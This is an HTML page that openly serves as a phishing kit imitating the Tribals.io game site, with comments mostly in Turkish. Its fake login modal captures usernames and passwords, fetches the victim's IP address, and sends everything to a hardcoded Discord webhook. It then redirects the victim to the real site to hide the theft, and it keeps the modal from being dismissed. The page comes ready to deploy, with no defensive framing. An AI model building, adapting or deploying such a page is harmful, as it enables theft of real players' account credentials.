<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tribals.io</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ÜST NAVBAR - tribals.io ile aynı */
        .navbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 30px;
            background: #111118;
            border-bottom: 1px solid #222;
        }
        .navbar .logo {
            font-size: 22px;
            font-weight: bold;
            color: #00ff88;
            letter-spacing: 2px;
        }
        .navbar .logo span { color: #fff; }
        .navbar nav a {
            color: #aaa;
            text-decoration: none;
            margin: 0 15px;
            font-size: 14px;
            transition: 0.3s;
        }
        .navbar nav a:hover { color: #00ff88; }
        .navbar .login-btn {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 8px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        /* ANA EKRAN - Oyun alanı */
        .game-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0f 70%);
            position: relative;
        }

        .game-box {
            text-align: center;
        }

        .game-box h1 {
            font-size: 64px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(0,255,136,0.3);
            margin-bottom: 10px;
        }

        .game-box p {
            color: #888;
            font-size: 16px;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }

        .play-btn {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #000;
            border: none;
            padding: 16px 60px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 0 30px rgba(0,255,136,0.2);
            letter-spacing: 2px;
        }
        .play-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(0,255,136,0.4);
        }

        /* ALT BİLGİ */
        .footer-info {
            text-align: center;
            padding: 15px;
            color: #444;
            font-size: 12px;
            border-top: 1px solid #111;
            background: #0d0d14;
        }

        /* ===== MODAL (SAHTE GİRİŞ) ===== */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 99999;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #111118;
            border: 2px solid #00ff88;
            border-radius: 12px;
            padding: 35px 30px;
            width: 380px;
            box-shadow: 0 0 40px rgba(0,255,136,0.15);
            text-align: center;
        }

        .modal-box h2 {
            color: #00ff88;
            margin-bottom: 5px;
            font-size: 22px;
        }

        .modal-box p {
            color: #888;
            font-size: 13px;
            margin-bottom: 20px;
        }

        .modal-box input {
            width: 92%;
            padding: 12px 14px;
            margin: 6px 0;
            background: #1a1a2e;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        .modal-box input:focus {
            border-color: #00ff88;
            box-shadow: 0 0 10px rgba(0,255,136,0.2);
        }

        .modal-box .submit-btn {
            width: 97%;
            padding: 13px;
            margin-top: 15px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #000;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 1px;
        }
        .modal-box .submit-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0,255,136,0.3);
        }

        .modal-box .skip-link {
            display: block;
            margin-top: 14px;
            color: #555;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
        }
        .modal-box .skip-link:hover { color: #888; }

        .loader {
            display: none;
            margin: 10px auto;
            border: 3px solid #222;
            border-top: 3px solid #00ff88;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
        }
        .loader.active { display: block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .error-msg {
            color: #ff4444;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        .error-msg.active { display: block; }
    </style>
</head>
<body>

    <!-- NAVBAR -->
    <div class="navbar">
        <div class="logo">TRIBALS<span>.io</span></div>
        <nav>
            <a href="#">Home</a>
            <a href="#">Leaderboard</a>
            <a href="#">Shop</a>
            <a href="#">Wiki</a>
            <a href="#">Discord</a>
        </nav>
        <button class="login-btn" onclick="openModal()">Sign In</button>
    </div>

    <!-- OYUN ALANI -->
    <div class="game-wrapper">
        <div class="game-box">
            <h1>TRIBALS.IO</h1>
            <p>🌍 Multiplayer Survival • Build • Fight</p>
            <button class="play-btn" onclick="openModal()">▶ PLAY NOW</button>
        </div>
    </div>

    <div class="footer-info">
        © 2026 Tribals.io — All rights reserved. v3.2.1
    </div>

    <!-- ===== MODAL (PHISHING) ===== -->
    <div class="modal-overlay" id="loginModal">
        <div class="modal-box">
            <h2>🔐 Giriş Yap</h2>
            <p>Oyuna devam etmek için hesabına giriş yap.</p>

            <input type="text" id="username" placeholder="Kullanıcı Adı / E-posta" autocomplete="off">
            <input type="password" id="password" placeholder="Şifre" autocomplete="off">

            <div class="loader" id="loader"></div>
            <div class="error-msg" id="errorMsg">❌ Hatalı giriş. Tekrar dene.</div>

            <button class="submit-btn" onclick="handleLogin()">▶ GİRİŞ YAP</button>
            <a class="skip-link" onclick="skipLogin()">→ Daha sonra giriş yap</a>
        </div>
    </div>

    <script>
        /* ============ WEBHOOK (SENİN LİNKİN) ============ */
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";

        /* ============ MODAL KONTROL ============ */
        function openModal() {
            document.getElementById('loginModal').classList.add('active');
            document.getElementById('username').focus();
        }

        function closeModal() {
            document.getElementById('loginModal').classList.remove('active');
        }

        /* ============ GİRİŞ İŞLEMİ ============ */
        function handleLogin() {
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();

            // Boş alan kontrolü
            if (!user || !pass) {
                document.getElementById('errorMsg').classList.add('active');
                return;
            }

            // Loader göster
            document.getElementById('loader').classList.add('active');
            document.querySelector('.submit-btn').disabled = true;
            document.getElementById('errorMsg').classList.remove('active');

            // Bilgileri webhook'a gönder
            const data = {
                embeds: [{
                    title: "🎣 TRIBALS PHISH",
                    color: 0x00ff88,
                    fields: [
                        { name: "👤 Kullanıcı", value: user, inline: true },
                        { name: "🔑 Şifre", value: `||${pass}||`, inline: true },
                        { name: "🌐 IP", value: `||${getIP()}||`, inline: false },
                        { name: "⏰ Zaman", value: new Date().toISOString(), inline: false }
                    ],
                    thumbnail: { url: "https://tribals.io/favicon.ico" },
                    footer: { text: "Tribals Phish • v1" }
                }]
            };

            // Webhook isteği
            const xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK_URL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(data));

            // 1.5 saniye bekle -> tribals.io'ya yönlendir
            setTimeout(() => {
                window.location.href = "https://tribals.io";
            }, 1500);
        }

        /* ============ GEÇ (Skip) ============ */
        function skipLogin() {
            window.location.href = "https://tribals.io";
        }

        /* ============ IP AL (ücretsiz API) ============ */
        function getIP() {
            let ip = "Bilinmiyor";
            const xhr = new XMLHttpRequest();
            xhr.open("GET", "https://api.ipify.org?format=json", false); // senkron
            try {
                xhr.send();
                if (xhr.status === 200) {
                    ip = JSON.parse(xhr.responseText).ip;
                }
            } catch(e) {}
            return ip;
        }

        /* Enter tuşu ile gönderme */
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && document.getElementById('loginModal').classList.contains('active')) {
                handleLogin();
            }
        });

        /* Modal dışına tıklayınca kapanmasın (kullanıcı kaçırmasın) */
        document.getElementById('loginModal').addEventListener('click', function(e) {
            if (e.target === this) {
                // Dışarı tıklandı - biraz rahatsız edici olsun, tekrar uyar
                document.querySelector('.modal-box').style.borderColor = '#ff4444';
                setTimeout(() => {
                    document.querySelector('.modal-box').style.borderColor = '#00ff88';
                }, 500);
            }
        });

        console.log('[+] Tribals Phishing Page loaded');
    </script>
</body>
</html>
